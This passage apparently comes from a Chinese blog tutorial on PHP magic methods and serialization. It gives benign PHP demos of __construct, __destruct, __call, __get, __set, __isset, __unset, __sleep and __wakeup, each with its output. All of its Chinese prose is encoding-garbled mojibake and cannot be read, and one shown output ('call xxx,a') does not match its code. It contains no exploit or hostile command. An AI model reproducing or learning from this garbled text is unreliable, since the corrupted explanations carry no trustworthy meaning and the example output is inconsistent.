<p>__toString() 	&#x2F;&#x2F;æŠŠç±»å½“åšå­—ç¬¦ä¸²æ—¶è§¦å‘<br>1.{å› ä¸ºechoæ— æ³•è¾“å‡ºå¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¯¥é­”æ³•æ–¹æ³•ï¼Œåœ¨ç›´æ¥è¾“å‡ºå¯¹è±¡å¼•ç”¨çš„æ—¶å€™ï¼Œå°±ä¸ä¼šäº§ç”Ÿé”™è¯¯ï¼Œè€Œæ˜¯è‡ªåŠ¨è°ƒç”¨äº†â€__toString()â€æ–¹æ³•, è¾“å‡ºâ€œ__toString()â€æ–¹æ³•ä¸­è¿”å›çš„å­—ç¬¦ï¼Œæ‰€ä»¥â€œ__toString()â€æ–¹æ³•ä¸€å®šè¦æœ‰ä¸ªè¿”å›å€¼(return è¯­å¥)}<br>2.å½“ç„¶é™¤äº†å½“ä½œå­—ç¬¦ä¸²æ‰“å°æ—¶ä¼šè§¦å‘ï¼Œå½“æŠŠå®ä¾‹åŒ–çš„ç±»å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œpreg_matchåŒ¹é…æ—¶ï¼Œä¹Ÿä¼šè§¦å‘</p>
<p>__get() 	&#x2F;&#x2F;ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</p>
<p>__set() 	&#x2F;&#x2F;ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</p>
<p>__invoke()  &#x2F;&#x2F;å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</p>
<p>__call()     &#x2F;&#x2F;åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p>
<p>__callStatic()  &#x2F;&#x2F;åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„å±æ€§</p>
<p>__isset()   &#x2F;&#x2F;å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</p>
<p>__set_state()   &#x2F;&#x2F;è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>__clone()  &#x2F;&#x2F;å½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</p>
<p>__autoload()   &#x2F;&#x2F;å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</p>
<p>__debugInfo()   &#x2F;&#x2F;æ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</p>
</blockquote>
<p>Â·æ³¨æ„ï¼š</p>
<blockquote>
<p>PHP å°†æ‰€æœ‰ä»¥ <code>__</code>ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚æ‰€ä»¥åœ¨å®šä¹‰ç±»æ–¹æ³•æ—¶ï¼Œé™¤äº†ä¸Šè¿°é­”æœ¯æ–¹æ³•ï¼Œå»ºè®®ä¸è¦ä»¥ <code>__</code> ä¸ºå‰ç¼€ã€‚</p>
<p><strong>Â·sleep() å’Œ wakeup()</strong></p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">public __sleep ( void )<span class="keyword"> :</span><span class="built_in"> array</span></span><br><span class="line"><span class="built_in"></span>__wakeup ( void )<span class="keyword"> :</span> void</span><br></pre></td></tr></table></figure>

<p><code>serialize()</code> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ <code>NULL</code> è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª <code>E_NOTICE</code> çº§åˆ«çš„é”™è¯¯ã€‚</p>
<p><strong>Note</strong></p>
<blockquote>
<ol>
<li>__sleep() ä¸èƒ½è¿”å›çˆ¶ç±»çš„ç§æœ‰æˆå‘˜çš„åå­—ã€‚è¿™æ ·åšä¼šäº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚å¯ä»¥ç”¨ Serializable æ¥å£æ¥æ›¿ä»£ã€‚</li>
<li>__sleep() æ–¹æ³•å¸¸ç”¨äºæäº¤æœªæäº¤çš„æ•°æ®ï¼Œæˆ–ç±»ä¼¼çš„æ¸…ç†æ“ä½œã€‚åŒæ—¶ï¼Œå¦‚æœæœ‰ä¸€äº›å¾ˆå¤§çš„å¯¹è±¡ï¼Œä½†ä¸éœ€è¦å…¨éƒ¨ä¿å­˜ï¼Œè¿™ä¸ªåŠŸèƒ½å°±å¾ˆå¥½ç”¨ã€‚</li>
<li>ä¸ä¹‹ç›¸åï¼Œunserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</li>
<li>__wakeup() ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚</li>
</ol>
</blockquote>
<p><strong>è®¿é—®æ§åˆ¶</strong></p>
<blockquote>
<ul>
<li>PHP å¯¹å±æ€§æˆ–æ–¹æ³•çš„è®¿é—®æ§åˆ¶ï¼Œæ˜¯é€šè¿‡åœ¨å‰é¢æ·»åŠ å…³é”®å­— publicï¼ˆå…¬æœ‰ï¼‰ï¼Œprotectedï¼ˆå—ä¿æŠ¤ï¼‰æˆ– privateï¼ˆç§æœ‰ï¼‰æ¥å®ç°çš„ã€‚</li>
<li>publicï¼ˆå…¬æœ‰ï¼‰ï¼šå…¬æœ‰çš„ç±»æˆå‘˜å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®ã€‚</li>
<li>protectedï¼ˆå—ä¿æŠ¤ï¼‰ï¼šå—ä¿æŠ¤çš„ç±»æˆå‘˜åˆ™å¯ä»¥è¢«å…¶è‡ªèº«ä»¥åŠå…¶å­ç±»å’Œçˆ¶ç±»è®¿é—®ã€‚</li>
<li>privateï¼ˆç§æœ‰ï¼‰ï¼šç§æœ‰çš„ç±»æˆå‘˜åˆ™åªèƒ½è¢«å…¶å®šä¹‰æ‰€åœ¨çš„ç±»è®¿é—®ã€‚</li>
</ul>
</blockquote>
<p><code>unserialize() å°†å·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸå› PHP çš„å€¼ã€‚</code><br><code>åºåˆ—åŒ–è¯·ä½¿ç”¨ serialize() å‡½æ•°ã€‚</code></p>
<p><strong>è¯­æ³•</strong></p>
<blockquote>
<p><code>unserialize(str)</code></p>
<p>å‚æ•°    æè¿°<br><code>str</code>    å¿…éœ€ã€‚ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚<br>__wakeup()æ˜¯ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ã€‚unserialize()ä¼šæ£€æŸ¥å­˜åœ¨ä¸€ä¸ª__wakeup()æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™å…ˆä¼šè°ƒç”¨__wakeup()æ–¹æ³•ã€‚</p>
</blockquote>
</blockquote>
<hr>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p><code>__construct()</code>è¢«ç§°ä¸ºæ„é€ æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åœ¨åˆ›é€ ä¸€ä¸ªå¯¹è±¡æ—¶å€™ï¼Œé¦–å…ˆä¼šå»æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•ã€‚ä½†æ˜¯åœ¨<code>åºåˆ—åŒ–</code>å’Œ<code>ååºåˆ—åŒ–</code>è¿‡ç¨‹æ˜¯ä¸ä¼šè§¦å‘çš„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct test</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œåˆ›å»ºå¯¹è±¡çš„æ—¶å€™è§¦å‘äº†ä¸€æ¬¡ï¼Œåœ¨åé¢çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½æ²¡æœ‰è§¦å‘ã€‚</p>
<hr>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>åœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__destruct test</span><br><span class="line">__destruct test</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†ä¸¤æ¬¡<code>__destruct()</code>ï¼Œå› ä¸ºä¸€ä¸ªå°±æ˜¯å®ä¾‹åŒ–çš„æ—¶å€™åˆ›å»ºçš„å¯¹è±¡ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ååºåˆ—åŒ–åç”Ÿæˆçš„å¯¹è±¡ã€‚</p>
<hr>
<h4 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h4><p>åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__call()</code> ä¼šè¢«è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ è°ƒç”¨äº†ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">abc</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">abc,a</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°**__call**éœ€è¦å®šä¹‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯è¡¨ç¤ºè°ƒç”¨çš„å‡½æ•°åï¼Œä¸€èˆ¬å¼€å‘ä¼šåœ¨è¿™é‡ŒæŠ¥é”™å†™xxxä¸å­˜åœ¨è¿™ä¸ªå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ å…¥çš„æ•°ç»„ï¼Œè¿™é‡Œåªä¼ å…¥äº†ä¸€ä¸ªaã€‚</p>
<hr>
<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h4><p>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<code>__callStatic()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call xxx,a</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…ˆæ¥å­¦ä¹ ä¸€ä¸‹åŒå†’å·çš„ç”¨æ³•ï¼ŒåŒå†’å·ä¹Ÿå«åšèŒƒå›´è§£ææ“ä½œç¬¦ï¼ˆä¹Ÿå¯ç§°ä½œ Paamayim Nekudotayimï¼‰æˆ–è€…æ›´ç®€å•åœ°è¯´æ˜¯ä¸€å¯¹å†’å·ï¼Œå¯ä»¥ç”¨äºè®¿é—®é™æ€æˆå‘˜ï¼Œç±»å¸¸é‡ï¼Œè¿˜å¯ä»¥ç”¨äºè¦†ç›–ç±»ä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚è‡ª PHP 5.3.0 èµ·ï¼Œå¯ä»¥é€šè¿‡å˜é‡æ¥å¼•ç”¨ç±»ï¼Œè¯¥å˜é‡çš„å€¼ä¸èƒ½æ˜¯å…³é”®å­—ï¼ˆå¦‚ <strong>self</strong>ï¼Œ<strong>parent</strong> å’Œ <strong>static</strong>ï¼‰ã€‚ä¸**__call<strong>ä¸åŒçš„æ˜¯éœ€è¦æ·»åŠ </strong>static**ï¼Œåªæœ‰è®¿é—®ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ‰ä¼šè§¦å‘ã€‚</p>
<hr>
<h4 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h4><p>è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<code>__get()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure>

<p><code>__get</code>é­”æœ¯æ–¹æ³•éœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨ç€è®¿é—®ä¸å­˜åœ¨çš„å±æ€§å€¼ã€‚</p>
<hr>
<h4 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h4><p>ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<code>__set()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>set</strong>è·Ÿ<strong>get</strong>ç›¸åï¼Œä¸€ä¸ªæ˜¯è®¿é—®ä¸å­˜åœ¨çš„å±æ€§ï¼Œä¸€ä¸ªæ˜¯ç»™ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼ã€‚</p>
<hr>
<p>__isset</p>
<p>å¯¹<strong>ä¸å¯è®¿é—®å±æ€§</strong>ï¼ˆæ¯”å¦‚privateçš„å±æ€§ï¼‰è°ƒç”¨ <strong>isset()</strong> æˆ– <strong>empty()</strong> æ—¶ï¼Œ<code>__isset()</code> ä¼šè¢«è°ƒç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure>

<p>è¯¥é­”æœ¯æ–¹æ³•ä½¿ç”¨äº†<strong>isset()<strong>æˆ–è€…</strong>empty()<strong>åªè¦å±æ€§æ˜¯</strong>private</strong>æˆ–è€…ä¸å­˜åœ¨çš„éƒ½ä¼šè§¦å‘ã€‚</p>
<hr>
<h4 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h4><p>å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ <strong>unset()</strong> æ—¶ï¼Œ**__unset()** ä¼šè¢«è°ƒç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†é­”æœ¯æ–¹æ³• <code>__unset()</code> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <strong>unset()</strong> å‡½æ•°æ¥é”€æ¯ç±»çš„ç§æœ‰çš„å±æ€§ï¼Œæˆ–åœ¨é”€æ¯ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶å¾—åˆ°é€šçŸ¥ã€‚</p>
<hr>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h4><p><strong>serialize()</strong> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡è½½åºåˆ—åŒ–è°ƒç”¨çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// è¿”å›éœ€è¦åºåˆ—åŒ–çš„å˜é‡åï¼Œè¿‡æ»¤æ‰passwordå˜é‡</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æ‰§è¡Œåºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆæ‰§è¡Œ<strong>sleep()å‡½æ•°ï¼Œä¸Šé¢</strong>sleepçš„å‡½æ•°ä½œç”¨æ˜¯è¿‡æ»¤æ‰passwordçš„å˜é‡å€¼ã€‚</p>
<hr>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code>__wakeup()</code>æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup()</code> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p>
<p>é¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æºï¼Œè¿”å›voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚</p>
